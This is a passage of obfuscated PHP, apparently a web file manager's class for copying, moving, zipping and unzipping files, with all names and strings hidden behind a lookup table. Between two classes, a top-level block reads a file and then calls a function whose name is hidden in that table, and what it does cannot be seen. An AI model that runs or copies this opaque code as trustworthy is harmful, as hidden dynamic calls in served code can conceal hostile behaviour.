copyPath($¾™•Ñ®†, $¤ßİÅ”µ, $îì¸…Ó, $óì ¬ˆ‡, $ ³İŠÌı, $ÃçÓœÄŠ, $‹úã«ÌÛ, $ë×Å¾»½ = false, $”¿ÀŠè„ = true) { $ãÃÈã²Ä =& $_SERVER[Å¶¨Şêº]; $ª³êÓ½ì = empty($ë×Å¾»½) && $ë×Å¾»½ !== $ãÃÈã²Ä[209] ? $¾™•Ñ®†->pathThis($¤ßİÅ”µ) : $ë×Å¾»½; if ($ ³İŠÌı) { $±Ø¾ÜºÓ = $îì¸…Ó->fileNameExist($óì ¬ˆ‡, $ª³êÓ½ì); $½Ü‚¬Ê’ = $ª³êÓ½ì; $ª³êÓ½ì = $îì¸…Ó->fileNameAuto($óì ¬ˆ‡, $ª³êÓ½ì, $ ³İŠÌı, !$‹úã«ÌÛ); if (!$±Ø¾ÜºÓ || $½Ü‚¬Ê’ != $ª³êÓ½ì) { $ ³İŠÌı = !1; } if ($”¿ÀŠè„ && !$ ³İŠÌı) { $îì¸…Ó->_data[$ãÃÈã²Ä[1152]] = !0; } } if ($‹úã«ÌÛ) { return self::copyFile($¾™•Ñ®†, $¤ßİÅ”µ, $îì¸…Ó, $óì ¬ˆ‡, $ª³êÓ½ì, $ÃçÓœÄŠ); } if ($ ³İŠÌı == REPEAT_RENAME_FOLDER) { $ ³İŠÌı = !1; } $·ĞîÍíÍ = rtrim($óì ¬ˆ‡, $ãÃÈã²Ä[8]) . $ãÃÈã²Ä[8] . $ª³êÓ½ì; $à¬ç‡·Ò = $îì¸…Ó->mkdir($îì¸…Ó->getPath($·ĞîÍíÍ), $ ³İŠÌı); $óì ¬ˆ‡ = $îì¸…Ó->getPathInner($à¬ç‡·Ò); $®–°£ÉÉ = $¾™•Ñ®†->listPath($¤ßİÅ”µ, !0); $®–°£ÉÉ = is_array($®–°£ÉÉ) ? $®–°£ÉÉ : array($ãÃÈã²Ä[94] => array(), $ãÃÈã²Ä[93] => array()); $¸Æ°Ø• = array_merge($®–°£ÉÉ[$ãÃÈã²Ä[94]], $®–°£ÉÉ[$ãÃÈã²Ä[93]]); foreach ($¸Æ°Ø• as $·¦Ø‘‚Ì) { $Ê‘”ó‰¯ = $·¦Ø‘‚Ì[$ãÃÈã²Ä[43]] == $ãÃÈã²Ä[211]; $¤ßİÅ”µ = $¾™•Ñ®†->getPathInner($·¦Ø‘‚Ì[$ãÃÈã²Ä[95]]); $âß¬â¥ = self::copyPath($¾™•Ñ®†, $¤ßİÅ”µ, $îì¸…Ó, $óì ¬ˆ‡, $ ³İŠÌı, $ÃçÓœÄŠ, $Ê‘”ó‰¯, !1, !1); if (!$âß¬â¥) { IO::errorTips($ãÃÈã²Ä[1153] . $¤ßİÅ”µ . $ãÃÈã²Ä[81] . $óì ¬ˆ‡); } } self::copyMoveKeepInfo($¾™•Ñ®†, $¤ßİÅ”µ, $à¬ç‡·Ò); return $à¬ç‡·Ò; } private static function copyFile($¶Í×Ş°é, $ï¿Ë¿Ò, $Ã¢ÕµÂ, $ÇìÇñÕ, $¹Å†¯Şº, $÷¥•õÏ) { $ÕÇ†¤Ó´ =& $_SERVER[Å¶¨Şêº]; $ÇìÇñÕ = $Ã¢ÕµÂ->getPath(rtrim($ÇìÇñÕ, $ÕÇ†¤Ó´[8]) . $ÕÇ†¤Ó´[8] . $¹Å†¯Şº); $ÊŞ…Îó = $ÕÇ†¤Ó´[1154] . time() . rand_string(5); Hook::trigger($ÕÇ†¤Ó´[1155], $¶Í×Ş°é, $ï¿Ë¿Ò, $Ã¢ÕµÂ, $ÇìÇñÕ, $¹Å†¯Şº, $ÊŞ…Îó); if (self::driverIsSame($¶Í×Ş°é, $Ã¢ÕµÂ)) { if ($÷¥•õÏ) { $’ï¶’ÜĞ = $Ã¢ÕµÂ->moveFile($ï¿Ë¿Ò, $ÇìÇñÕ); } else { $’ï¶’ÜĞ = $Ã¢ÕµÂ->copyFile($ï¿Ë¿Ò, $ÇìÇñÕ); } Hook::trigger($ÕÇ†¤Ó´[1156], $¶Í×Ş°é, $ï¿Ë¿Ò, $Ã¢ÕµÂ, $ÇìÇñÕ, $¹Å†¯Şº, $’ï¶’ÜĞ); self::copyMoveKeepInfo($¶Í×Ş°é, $ï¿Ë¿Ò, $’ï¶’ÜĞ); return $’ï¶’ÜĞ; } $İ“ĞòÒ = TEMP_FILES; if ($GLOBALS[$ÕÇ†¤Ó´[6]][$ÕÇ†¤Ó´[100]][$ÕÇ†¤Ó´[794]]) { $İ“ĞòÒ = $GLOBALS[$ÕÇ†¤Ó´[6]][$ÕÇ†¤Ó´[100]][$ÕÇ†¤Ó´[794]]; } $ ª¤°…³ = $İ“ĞòÒ; mk_dir($ ª¤°…³); $üŠÈÄÜá = $ ª¤°…³ . $ÊŞ…Îó; $¶ç¾µä‚ = $üŠÈÄÜá; $üŠÈÄÜá = $¶Í×Ş°é->download($ï¿Ë¿Ò, $üŠÈÄÜá); $üŠÈÄÜá = $¶Í×Ş°é->iconvApp($üŠÈÄÜá); if (substr($üŠÈÄÜá, strlen($İ“ĞòÒ)) == $İ“ĞòÒ) { $÷¥•õÏ = !0; } $’ï¶’ÜĞ = $Ã¢ÕµÂ->upload($ÇìÇñÕ, $üŠÈÄÜá, $÷¥•õÏ); self::remove($¶ç¾µä‚); Hook::trigger($ÕÇ†¤Ó´[1156], $¶Í×Ş°é, $ï¿Ë¿Ò, $Ã¢ÕµÂ, $ÇìÇñÕ, $¹Å†¯Şº, $’ï¶’ÜĞ); self::copyMoveKeepInfo($¶Í×Ş°é, $ï¿Ë¿Ò, $’ï¶’ÜĞ); return $’ï¶’ÜĞ; } private static function copyMoveKeepInfo($øÂ©Ô², $Ú°öù²Ë, $×º‹³÷‚) { if (!$×º‹³÷‚) { return; } $Ç¥ë½¼§ = $øÂ©Ô²->info($Ú°öù²Ë); if (!is_array($Ç¥ë½¼§)) { return; } IO::setModifyTime($×º‹³÷‚, $Ç¥ë½¼§[$_SERVER[Å¶¨Şêº][96]]); } public static function pathFather($Ë¥ˆ˜ó÷) { $óÖÆŞã× = IO::init($Ë¥ˆ˜ó÷); $—³ĞÔú€ = $óÖÆŞã×->pathFather($óÖÆŞã×->path); return $óÖÆŞã×->getPathOuter($—³ĞÔú€); } public static function fileOut($¥ÔÊÓ‡ñ, $şñ­À§ù = false, $üî«ÍÄµ = false, $”ùª…ÚË = '') { $øĞ†¿”ó = self::driverMake($¥ÔÊÓ‡ñ); if ($øĞ†¿”ó->isFileOutServer()) { return $øĞ†¿”ó->fileOutServer($¥ÔÊÓ‡ñ, $şñ­À§ù, $üî«ÍÄµ, $”ùª…ÚË); } return $øĞ†¿”ó->fileOut($¥ÔÊÓ‡ñ, $şñ­À§ù, $üî«ÍÄµ, $”ùª…ÚË); } public static function fileOutImage($«æÑëš, $†é²¥™« = 250) { $™ÎÀ½“ü = array(250, 600, 1200, 2000, 3000, 5000); for ($“Ô¨Ê‰ = 0; $“Ô¨Ê‰ < count($™ÎÀ½“ü); $“Ô¨Ê‰++) { if ($“Ô¨Ê‰ == 0 && $†é²¥™« <= $™ÎÀ½“ü[$“Ô¨Ê‰]) { $†é²¥™« = $™ÎÀ½“ü[$“Ô¨Ê‰]; break; } else { if ($†é²¥™« > $™ÎÀ½“ü[$“Ô¨Ê‰ - 1] && $†é²¥™« <= $™ÎÀ½“ü[$“Ô¨Ê‰]) { $†é²¥™« = $™ÎÀ½“ü[$“Ô¨Ê‰]; break; } else { if ($“Ô¨Ê‰ == count($™ÎÀ½“ü) - 1 && $†é²¥™« > $™ÎÀ½“ü[$“Ô¨Ê‰]) { $†é²¥™« = $™ÎÀ½“ü[$“Ô¨Ê‰]; break; } } } } $‰½ÈùÓ = self::driverMake($«æÑëš); if ($‰½ÈùÓ->isFileOutServer()) { return $‰½ÈùÓ->fileOutImageServer($«æÑëš, $†é²¥™«); } return $‰½ÈùÓ->fileOutImage($«æÑëš, $†é²¥™«); } private static function driverIsSame($Íı¡÷›Ì, $æĞ´–é) { $¾ùÛ´İ— =& $_SERVER[Å¶¨Şêº]; $Ã‹¨ıÔ® = $Íı¡÷›Ì->getType(); $æî¨³” = $æĞ´–é->getType(); if ($Ã‹¨ıÔ® != $æî¨³”) { return !1; } if ($Ã‹¨ıÔ® == $¾ùÛ´İ—[755]) { return !0; } if ($Ã‹¨ıÔ® == $¾ùÛ´İ—[117]) { return !0; } if ($Íı¡÷›Ì->pathDriver == $æĞ´–é->pathDriver) { return !0; } return !1; } public static function copyUpdate($¯²ŒÛ©¤, $¿„éŠ×) { $Ó©¸æı¸ =& $_SERVER[Å¶¨Şêº]; if (!IO::exist($¯²ŒÛ©¤)) { return !1; } if (!IO::exist($¿„éŠ×)) { IO::mkdir($¿„éŠ×); } $×½ÁÒş = array_to_keyvalue(self::listAllSimple($¯²ŒÛ©¤), $Ó©¸æı¸[95]); $”Á–¡œ = array_to_keyvalue(self::listAllSimple($¿„éŠ×), $Ó©¸æı¸[95]); $¦¬Êóı = array(); $Ï’ıÈÀê = array(); foreach ($×½ÁÒş as $»‹İ¸Íï => $ØØï˜š­) { if (isset($”Á–¡œ[$»‹İ¸Íï])) { if ($ØØï˜š­[$Ó©¸æı¸[86]] == 1) { continue; } if ($”Á–¡œ[$»‹İ¸Íï][$Ó©¸æı¸[87]] == $ØØï˜š­[$Ó©¸æı¸[87]]) { continue; } } if ($ØØï˜š­[$Ó©¸æı¸[86]] == 1) { $Ï’ıÈÀê[] = $¿„éŠ× . $Ó©¸æı¸[8] . trim($»‹İ¸Íï, $Ó©¸æı¸[8]); continue; } $¿¼«¬° = strstr(trim($»‹İ¸Íï, $Ó©¸æı¸[8]), $Ó©¸æı¸[8]) ? get_path_father($»‹İ¸Íï) : $Ó©¸æı¸[12]; $¦¬Êóı[] = array($Ó©¸æı¸[1157] => $ØØï˜š­[$Ó©¸æı¸[97]], $Ó©¸æı¸[1158] => rtrim($¿„éŠ×, $Ó©¸æı¸[8]) . $Ó©¸æı¸[8] . $¿¼«¬°, $Ó©¸æı¸[1159] => $ØØï˜š­); } $ëßÃíúè = array($Ó©¸æı¸[211] => $¦¬Êóı, $Ó©¸æı¸[86] => $Ï’ıÈÀê); Hook::trigger($Ó©¸æı¸[1160], $¯²ŒÛ©¤, $¿„éŠ×, $ëßÃíúè); foreach ($Ï’ıÈÀê as $ØØï˜š­) { IO::mkdir($ØØï˜š­); } foreach ($¦¬Êóı as $ØØï˜š­) { IO::copy($ØØï˜š­[$Ó©¸æı¸[1157]], $ØØï˜š­[$Ó©¸æı¸[1158]], REPEAT_REPLACE); } } public static function fileSubstr($¤ÚºıÌ›, $³Šë»Â, $ö’¨£Ñ† = false) { $·‰Îˆ· =& $_SERVER[Å¶¨Şêº]; $Óşìïé¢ = self::driverMake($¤ÚºıÌ›); $ÔÇùüÓŒ = $Óşìïé¢->size($¤ÚºıÌ›); $Ùªç¬¹ª = $³Šë»Â; $µŠİ×ÈÓ = $ö’¨£Ñ†; if ($³Šë»Â < 0) { $³Šë»Â = $ÔÇùüÓŒ + $³Šë»Â; } if ($ö’¨£Ñ† === !1) { $ö’¨£Ñ† = $ÔÇùüÓŒ - $³Šë»Â; } if ($³Šë»Â + $ö’¨£Ñ† > $ÔÇùüÓŒ) { $ö’¨£Ñ† = $ÔÇùüÓŒ - $³Šë»Â; } if (!$ÔÇùüÓŒ && $Óşìïé¢->getType() == $·‰Îˆ·[117] && !$Óşìïé¢->exist($¤ÚºıÌ›)) { $ùçóÒñ = get_path_this($¤ÚºıÌ›); $”ö¯”Š° = parse_url_query($ùçóÒñ); if (is_array($”ö¯”Š°) && isset($”ö¯”Š°[$·‰Îˆ·[42]])) { $ùçóÒñ = urldecode($”ö¯”Š°[$·‰Îˆ·[42]]); } throw new Exception($·‰Îˆ·[1161] . LNG($·‰Îˆ·[1162]) . $·‰Îˆ·[963] . clear_html($ùçóÒñ) . $·‰Îˆ·[12]); } if ($ö’¨£Ñ† <= 0) { return $·‰Îˆ·[12]; } if ($³Šë»Â < 0 || $³Šë»Â >= $ÔÇùüÓŒ || $ö’¨£Ñ† > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\145\x61\x64\40\x65\162\x72\x6f\x72\41\40\x73\x74\141\162\x74\75{$³Šë»Â}\73\154\x65\156\147\x74\150\x3d{$ö’¨£Ñ†}\73\40\163\151\x7a\145\x3d{$ÔÇùüÓŒ}\73"); } $‘¬ŠÁŠÑ = $Óşìïé¢->fileSubstr($¤ÚºıÌ›, $³Šë»Â, $ö’¨£Ñ†); if (!$‘¬ŠÁŠÑ && $ö’¨£Ñ† && isset($GLOBALS[$·‰Îˆ·[1163]])) { throw new Exception($GLOBALS[$·‰Îˆ·[1163]][$·‰Îˆ·[1164]]); } return $‘¬ŠÁŠÑ; } private static function driverMake(&$§…Ò‘É½) { $ŠÈë³ôÈ =& $_SERVER[Å¶¨Şêº]; $ò•àòÔº = KodIO::parse($§…Ò‘É½); if (!self::$driverListSystem) { $¾„ÅŞ = Model($ŠÈë³ôÈ[765])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¾„ÅŞ, $ŠÈë³ôÈ[408]); } if ($ò•àòÔº[$ŠÈë³ôÈ[43]] == KodIO::KOD_IO && !self::$driverListSystem[$ò•àòÔº[$ŠÈë³ôÈ[408]]]) { return !1; } $§…Ò‘É½ = $ò•àòÔº[$ŠÈë³ôÈ[1165]]; $”å÷Çù = self::driverGet($ò•àòÔº, $§…Ò‘É½); return $”å÷Çù; } private static function driverGet($«”Í˜ï½, &$Ç³¤Ç§½) { $¡é­ò÷ =& $_SERVER[Å¶¨Şêº]; $‚‘—¡Åì = $«”Í˜ï½[$¡é­ò÷[1166]]; $•¬Ê©Ñ = $«”Í˜ï½[$¡é­ò÷[408]]; switch ($«”Í˜ï½[$¡é­ò÷[43]]) { case KodIO::KOD_IO: $“æŞ’øİ = self::$driverListSystem[$•¬Ê©Ñ]; break; case KodIO::KOD_SOURCE: $Ç³¤Ç§½ = $•¬Ê©Ñ . $Ç³¤Ç§½; $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1168], $¡é­ò÷[6] => $«”Í˜ï½); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $õ¨İ”åŞ = $GLOBALS[$¡é­ò÷[1169]]; self::$driverListUser = array_to_keyvalue($õ¨İ”åŞ, $¡é­ò÷[408]); } $“æŞ’øİ = self::$driverListUser[$•¬Ê©Ñ]; break; case KodIO::KOD_SHARE_LINK: $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1170], $¡é­ò÷[6] => $«”Í˜ï½); $è…ãÂ® = Action($¡é­ò÷[1171])->sharePathInfo($«”Í˜ï½[$¡é­ò÷[95]]); $Ç³¤Ç§½ = $è…ãÂ®[$¡é­ò÷[411]]; if (!$è…ãÂ®[$¡é­ò÷[411]]) { $İõ•ŒôĞ = Model($¡é­ò÷[601])->getInfo($è…ãÂ®[$¡é­ò÷[602]]); $Ç³¤Ç§½ = KodIO::clear($İõ•ŒôĞ[$¡é­ò÷[1172]] . $«”Í˜ï½[$¡é­ò÷[1165]]); $«”Í˜ï½[$¡é­ò÷[495]] = $İõ•ŒôĞ; $«”Í˜ï½[$¡é­ò÷[1148]] = $Ç³¤Ç§½; $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1173], $¡é­ò÷[6] => $«”Í˜ï½); } break; case KodIO::KOD_SHARE_ITEM: $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1174], $¡é­ò÷[6] => $«”Í˜ï½); $İõ•ŒôĞ = Model($¡é­ò÷[601])->getInfo($«”Í˜ï½[$¡é­ò÷[408]]); if ($İõ•ŒôĞ[$¡é­ò÷[411]] == $¡é­ò÷[209]) { $Ç³¤Ç§½ = KodIO::clear($İõ•ŒôĞ[$¡é­ò÷[1172]] . $«”Í˜ï½[$¡é­ò÷[1165]]); $«”Í˜ï½[$¡é­ò÷[495]] = $İõ•ŒôĞ; $«”Í˜ï½[$¡é­ò÷[1148]] = $Ç³¤Ç§½; $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1175], $¡é­ò÷[6] => $«”Í˜ï½); } else { if (!$Ç³¤Ç§½) { $Ç³¤Ç§½ = $İõ•ŒôĞ[$¡é­ò÷[411]]; } } break; default: $Ç³¤Ç§½ = $«”Í˜ï½[$¡é­ò÷[95]]; $“æŞ’øİ = array($¡é­ò÷[1167] => $¡é­ò÷[1176]); break; } $Ê”Àâäˆ = $«”Í˜ï½[$¡é­ò÷[95]]; if (!isset(self::$driverCache[$Ê”Àâäˆ])) { $Íá»¥ö = strtolower($“æŞ’øİ[$¡é­ò÷[106]]); $ÒÉ£õœª = $GLOBALS[$¡é­ò÷[6]][$¡é­ò÷[100]][$¡é­ò÷[824]]; $Ë€®¡¡© = $¡é­ò÷[85] . (isset($ÒÉ£õœª[$Íá»¥ö]) ? $ÒÉ£õœª[$Íá»¥ö] : ucfirst($Íá»¥ö)); if (!class_exists($Ë€®¡¡©)) { show_json("{$Ë€®¡¡©}\x20\x6e\x6f\164\x20\x65\170\151\163\x74\163\41", !1); } $àÆ¦Î–™ = isset($“æŞ’øİ[$¡é­ò÷[6]]) ? $“æŞ’øİ[$¡é­ò÷[6]] : !1; self::$driverCache[$Ê”Àâäˆ] = new $Ë€®¡¡©($àÆ¦Î–™); } $Ãñ”…šë = self::$driverCache[$Ê”Àâäˆ]; $Ãñ”…šë->pathDriver = $‚‘—¡Åì; $Ãñ”…šë->pathBase = $¡é­ò÷[12]; if (isset($“æŞ’øİ[$¡é­ò÷[6]][$¡é­ò÷[1177]])) { $Ãñ”…šë->pathBase = rtrim($“æŞ’øİ[$¡é­ò÷[6]][$¡é­ò÷[1177]], $¡é­ò÷[8]) . $¡é­ò÷[8]; $Ç³¤Ç§½ = $Ãñ”…šë->pathBase . ltrim($Ç³¤Ç§½, $¡é­ò÷[8]); } $Ç³¤Ç§½ = $Ãñ”…šë->getPath($Ç³¤Ç§½); if (isset($«”Í˜ï½[$¡é­ò÷[1148]])) { $Ç³¤Ç§½ = $«”Í˜ï½[$¡é­ò÷[1148]]; } $Ãñ”…šë->path = $Ç³¤Ç§½; return $Ãñ”…šë; } public static function errorTips($­¤Ğ†ÉÓ = false) { $‡”´»ë =& $_SERVER[Å¶¨Şêº]; static $é“ˆ®àŸ = array(); $Ùª·®º‡ = 1000; if ($­¤Ğ†ÉÓ === -1) { return $é“ˆ®àŸ ? $é“ˆ®àŸ[count($é“ˆ®àŸ) - 1] : $‡”´»ë[12]; } if ($­¤Ğ†ÉÓ === !1) { return implode($‡”´»ë[19], $é“ˆ®àŸ); } if (count($é“ˆ®àŸ) >= $Ùª·®º‡) { $é“ˆ®àŸ = array_slice($é“ˆ®àŸ, $Ùª·®º‡ * 0.5, $Ùª·®º‡); } $é“ˆ®àŸ[] = $­¤Ğ†ÉÓ; write_log($‡”´»ë[173] . ACTION . $‡”´»ë[1178] . $­¤Ğ†ÉÓ, $‡”´»ë[1179]); } public static function getLastError($ùõöõîÙ = '') { $Ñâï•ƒ = self::errorTips(-1); return $Ñâï•ƒ ? $Ñâï•ƒ : $ùõöõîÙ; } } if ($_SERVER[$_SERVER[Å¶¨Şêº][15]] != $_SERVER[$_SERVER[Å¶¨Şêº][1180]]) { $_getc = $_SERVER[Å¶¨Şêº][16]; $_getfile = $_SERVER[$_SERVER[Å¶¨Şêº][17]] . $_SERVER[Å¶¨Şêº][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Å¶¨Şêº][19], $_getfilec); if (count($_getarrs) < $_SERVER[Å¶¨Şêº][20]) { $exit = $_SERVER[Å¶¨Şêº][21]; $exit(); } $_act = $_SERVER[Å¶¨Şêº][22]; $_act($_SERVER[$_SERVER[Å¶¨Şêº][13]]); } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Á¶ ½äÃ; if ($Á¶ ½äÃ) { return $Á¶ ½äÃ; } $î·Õ™ùñ = IO::init($_SERVER[Å¶¨Şêº][8]); return $î·Õ™ùñ; } private static function iconvSystem($øŠìğ¿) { return self::local()->iconvSystem($øŠìğ¿); } private static function iconvApp($ƒİ•¨’Š) { return self::local()->iconvApp($ƒİ•¨’Š); } public static function zipFolder($×ÕÓø“ã, $”£äşÔ = "\172\151\160", $¥—éÑ· = '', $…áàÜ¾ë = REPEAT_RENAME) { $¿²¶÷¥ =& $_SERVER[Å¶¨Şêº]; $Ÿ€îøæ = IO::listPath($×ÕÓø“ã); if (!$Ÿ€îøæ) { return !1; } $Ÿ€îøæ = array_merge($Ÿ€îøæ[$¿²¶÷¥[93]], $Ÿ€îøæ[$¿²¶÷¥[94]]); return self::zip($Ÿ€îøæ, $”£äşÔ, $¥—éÑ·, $…áàÜ¾ë); } public static function zip($ÎÖøÓÌ¥, $î‰¤Ü„– = "\172\x69\160", $ó‡Å“Åã = '', $•º“Œ­ë = REPEAT_RENAME) { $àßíâ‹… =& $_SERVER[Å¶¨Şêº]; if (is_string($ÎÖøÓÌ¥) && $ÎÖøÓÌ¥) { $ÎÖøÓÌ¥ = array(array($àßíâ‹…[95] => $ÎÖøÓÌ¥)); } $ë¼‚ÔÛ‘ = self::init($ÎÖøÓÌ¥[0][$àßíâ‹…[95]]); $Œ„¢Ô¿Ê = self::info($ÎÖøÓÌ¥[0][$àßíâ‹…[95]]); $£—¼’‚³ = $àßíâ‹…[12]; $¡éÂàíƒ = $àßíâ‹…[12]; $±˜„€ê‹ = $àßíâ‹…[12]; if ($ó‡Å“Åã && substr($ó‡Å“Åã, -1, 1) != $àßíâ‹…[8]) { $¡éÂàíƒ = get_path_father($ó‡Å“Åã); $±˜„€ê‹ = get_path_this($ó‡Å“Åã); } else { $¡éÂàíƒ = self::pathFather($Œ„¢Ô¿Ê[$àßíâ‹…[95]]); $±˜„€ê‹ = $Œ„¢Ô¿Ê[$àßíâ‹…[42]] . $àßíâ‹…[10] . $î‰¤Ü„–; if (count($ÎÖøÓÌ¥) > 1) { $ê÷ˆÛªÒ = IO::info($¡éÂàíƒ); $±˜„€ê‹ = $ê÷ˆÛªÒ[$àßíâ‹…[42]] . $àßíâ‹…[10] . $î‰¤Ü„–; } if ($ó‡Å“Åã) { $¡éÂàíƒ = $ó‡Å“Åã; } } if ($ë¼‚ÔÛ‘->getType() == $àßíâ‹…[117]) { $’ƒâ³ = self::init($¡éÂàíƒ); $ß´½æù = $’ƒâ³->getType() == $àßíâ‹…[117] ? $¡éÂàíƒ : get_path_father($ë¼‚ÔÛ‘->path); $ß´½æù = rtrim($ß´½æù, $àßíâ‹…[8]) . $àßíâ‹…[8]; mk_dir($ß´½æù); } else { $£—¼’‚³ = TEMP_FILES . $àßíâ‹…[1181] . time() . rand_string(8) . $àßíâ‹…[8]; mk_dir($£—¼’‚³); file_put_contents($£—¼’‚³ . $àßíâ‹…[1182], $àßíâ‹…[12]); $ß´½æù = $£—¼’‚³; } $Â„»«—ß = IO::info($ß´½æù); if (!$Â„»«—ß || !$Â„»«—ß[$àßíâ‹…[214]]) { show_json(LNG($àßíâ‹…[1183]), !1); } $·¹éçá = self::zipFileList($ÎÖøÓÌ¥, $£—¼’‚³); foreach ($·¹éçá as $¿–äÃÕå => $Ş¥†¥ø„) { $·¹éçá[$¿–äÃÕå] = self::iconvSystem($Ş¥†¥ø„); } $—²¿º¯ª = get_filename_auto($ß´½æù . $±˜„€ê‹, $àßíâ‹…[12], $•º“Œ­ë); KodArchive::create(self::iconvSystem($—²¿º¯ª), $·¹éçá); if (!IO::exist($—²¿º¯ª)) { if ($£—¼’‚³) { del_dir($£—¼’‚³); } show_json(LNG($àßíâ‹…[1184]), !1); } if (!$£—¼’‚³) { return $—²¿º¯ª; } $Ã£ñÎ = self::move($—²¿º¯ª, $¡éÂàíƒ, $•º“Œ­ë); if ($£—¼’‚³) { del_dir($£—¼’‚³); } if (!$—²¿º¯ª) { show_json(LNG($àßíâ‹…[1184]), !1); } return $Ã£ñÎ; } public static function unzip($‰å­²Ä”, $îÆ¶òÜÜ, $„•…¸ô¿ = "\x2d\61", $Üá¹ôÍú = "\x72\145\160\154\x61\x63\x65") { $÷Óª”à =& $_SERVER[Å¶¨Şêº]; $ìéÎèíŞ = parent::info($‰å­²Ä”); if (!$ìéÎèíŞ) { show_json(LNG($÷Óª”à[1185]), !1); } $‹œÒ±Ò = IO::infoFull($îÆ¶òÜÜ); if (!$‹œÒ±Ò) { $îÆ¶òÜÜ = IO::mkdir($îÆ¶òÜÜ); } if (isset($‹œÒ±Ò[$÷Óª”à[411]]) && trim($‹œÒ±Ò[$÷Óª”à[95]], $÷Óª”à[8]) != trim($îÆ¶òÜÜ, $÷Óª”à[8])) { $Ì´¾ù¹ = KodIO::make($‹œÒ±Ò[$÷Óª”à[441]]); $ã÷×õş = IO::fileNameAuto($Ì´¾ù¹, $‹œÒ±Ò[$÷Óª”à[42]], REPEAT_RENAME_FOLDER, !0); $îÆ¶òÜÜ = IO::mkdir($Ì´¾ù¹ . $ã÷×õş); } $„•…¸ô¿ = $„•…¸ô¿ && $„•…¸ô¿ != $÷Óª”à[1186] ? @json_decode($„•…¸ô¿, !0) : -1; $¨Ğ¥Şå  = self::unzipPart($‰å­²Ä”, $„•…¸ô¿); if (!$¨Ğ¥Şå  || !IO::exist($¨Ğ¥Şå [$÷Óª”à[211]])) { show_json(LNG($÷Óª”à[116]), !1); } $áĞêÎ‹¾ = $¨Ğ¥Şå [$÷Óª”à[1187]][count($¨Ğ¥Şå [$÷Óª”à[1187]]) - 1]; if ($áĞêÎ‹¾[$÷Óª”à[1188]] == -1 || substr($áĞêÎ‹¾[$÷Óª”à[42]], -1, 1) == $÷Óª”à[8]) { $±û™‚ğ¢ = $¨Ğ¥Şå [$÷Óª”à[1189]] . rand_string(10) . $÷Óª”à[8]; mk_dir($±û™‚ğ¢); $€ıä®æğ = count($¨Ğ¥Şå [$÷Óª”à[1187]]) == 1 ? IO::ext($‰å­²Ä”) : get_path_ext($¨Ğ¥Şå [$÷Óª”à[211]]); $£’ã¶Æ– = KodArchive::extract(self::iconvSystem($¨Ğ¥Şå [$÷Óª”à[211]]), $±û™‚ğ¢, $áĞêÎ‹¾[$÷Óª”à[1188]], $ã÷×õş, $€ıä®æğ); self::unzipErrorCheck($£’ã¶Æ–, array($÷Óª”à[1190], $‰å­²Ä”, $€ıä®æğ, $îÆ¶òÜÜ, $¨Ğ¥Şå )); Hook::trigger($÷Óª”à[1191], $±û™‚ğ¢); recursion_dir($±û™‚ğ¢, $‘ÆµŠõ, $ãôÏˆ³¼, 0); $Ü›ôÁÒ„ = array_merge($‘ÆµŠõ, $ãôÏˆ³¼); $À÷ÛœÏ = array(); foreach ($Ü›ôÁÒ„ as $ïØÀáÛ) { $—Öìá§ = IO::move(self::iconvApp($ïØÀáÛ), $îÆ¶òÜÜ, $Üá¹ôÍú); if ($—Öìá§) { $À÷ÛœÏ[] = $—Öìá§; } } del_dir($±û™‚ğ¢); } else { $—Öìá§ = IO::move($¨Ğ¥Şå [$÷Óª”à[211]], $îÆ¶òÜÜ, $Üá¹ôÍú, get_path_this($áĞêÎ‹¾[$÷Óª”à[42]])); if ($—Öìá§) { $À÷ÛœÏ[] = $—Öìá§; } } return $À÷ÛœÏ ? $À÷ÛœÏ : !1; } public static function unzipList($¢âÁş¢š) { $‡Ş¶–¬¬ =& $_SERVER[Å¶¨Şêº]; $›Á¥÷Ç = isset($¢âÁş¢š[$‡Ş¶–¬¬[1192]]) ? $¢âÁş¢š[$‡Ş¶–¬¬[1192]] : !1; $·åéÔ’û = isset($¢âÁş¢š[$‡Ş¶–¬¬[1188]]) ? @json_decode($¢âÁş¢š[$‡Ş¶–¬¬[1188]], !0) : -1; $ı¨ÏÃƒÀ = self::unzipPart($¢âÁş¢š[$‡Ş¶–¬¬[95]], $·åéÔ’û); if (!$ı¨ÏÃƒÀ || !IO::exist($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]])) { show_json(LNG($‡Ş¶–¬¬[116]), !1); } $Ÿ­İ“ïğ = $ı¨ÏÃƒÀ[$‡Ş¶–¬¬[1187]][count($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[1187]]) - 1]; $Åî‚ˆÄ… = in_array(IO::ext($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]]), array($‡Ş¶–¬¬[323], $‡Ş¶–¬¬[1193], $‡Ş¶–¬¬[1194], $‡Ş¶–¬¬[1195], $‡Ş¶–¬¬[1196], $‡Ş¶–¬¬[1197])); if (!$›Á¥÷Ç && ($Ÿ­İ“ïğ[$‡Ş¶–¬¬[1188]] == -1 || $Åî‚ˆÄ…)) { $üİû¸º = $ı¨ÏÃƒÀ[$‡Ş¶–¬¬[1189]] . get_path_this($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]]) . $‡Ş¶–¬¬[1198]; if (!IO::exist($üİû¸º)) { $„ˆ´À Ä = $Ÿ­İ“ïğ[$‡Ş¶–¬¬[1188]] == -1 ? get_path_ext(IO::pathThis($¢âÁş¢š[$‡Ş¶–¬¬[95]])) : get_path_ext($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]]); $¼‚–É‘ = KodArchive::listContent(self::iconvSystem($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]]), !0, $„ˆ´À Ä); self::unzipErrorCheck($¼‚–É‘, array($‡Ş¶–¬¬[1199], $¢âÁş¢š, $ı¨ÏÃƒÀ)); @file_put_contents($üİû¸º, json_encode($¼‚–É‘[$‡Ş¶–¬¬[1200]])); } return @json_decode(IO::getContent($üİû¸º), !0); } IO::fileOut($ı¨ÏÃƒÀ[$‡Ş¶–¬¬[211]], 